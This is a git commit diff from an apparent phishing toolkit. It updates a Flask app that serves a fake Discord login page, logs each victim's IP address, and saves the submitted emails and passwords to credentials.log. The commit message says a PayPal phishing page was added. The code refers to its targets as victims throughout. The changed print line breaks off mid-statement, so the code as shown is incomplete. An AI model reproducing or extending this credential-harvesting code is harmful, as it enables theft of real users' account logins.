5c1c2663437433389df38f60cdaca5ea5dccfec3
Aarav Prasad <aarav@pagux.com>
2021-03-27 23:15:50 +0530

    💸Paypal added and bugfixes🐞
    ➕Added:
      💸Added PayPal phishing page
      ⛔Better error handling
      🚫Fixed syntax errors and bugs
      🔗Added if use nGrok? variable
      🎴Localhost errors fixed
      ➡️ Now overwrites text
      📧Email displayed before password
      💻Improved code syntax
    
    Co-Authored-By: Kritagyaispro <74377463+Kritagyaispro@users.noreply.github.com>

--- Sites/Discord/app.py
+++ Sites/Discord/app.py
@@ -13,31 +13,42 @@ host = argv[2]
 port = int(argv[3])
 sitename = argv[4]
 display_reqs = argv[5]
+ngrok_use = argv[6]
+
 
 #### Config
 app = Flask(__name__)
-logging.getLogger('werkzeug').disabled = True if display_reqs != "y" else None
-sys.modules['flask.cli'].show_server_banner = lambda *x: None
 colorama.init(autoreset=True)
 
+if display_reqs != "y" and ngrok_use != "y":
+    logging.getLogger('werkzeug').disabled = True
+    sys.modules['flask.cli'].show_server_banner = lambda *x: None
+elif display_reqs != "y":
+    logging.getLogger('werkzeug').disabled = True
+    sys.modules['flask.cli'].show_server_banner = lambda *x: None
 
-print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to to to the link...")
+
+print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to go to the link...", end="\r")
 #### App.route
 @app.route("/")
 def index():
-    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found: " + Fore.CYAN + request.headers.get('X-Forwarded-For'))
+    ip_addr = Fore.CYAN + request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else Fore.CYAN + request.remote_addr
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim has gone to the phishing page!" + " " * 40)
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", ip_addr)
     print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
-    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...")
+    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...",end="\r")
     return render_template("Discord.html")
 
 @app.route("/login", methods=["POST"])
 def getcreds():
     with open("credentials.log" , "a") as file:
-        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Victim entered credentials!")
-        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + request.form.get('email'), "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + request.form.get('password'))
-        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {request.headers.get('X-Forwarded-For')} : {sitename}\n")
-        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
-        return redirect(redirect_url)
+        ip_addr = request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr
+        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
+        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + request.form.get('email'), "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + request.form.get('password') + " " * 100)
+        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {ip_addr} : {sitename}\n")
+        print(Fore.RED + "[" + Fore.BLUE
+
+
 
 
 @app.route('/Discord_files/0.70a90daa9b002d99a7e7.css')
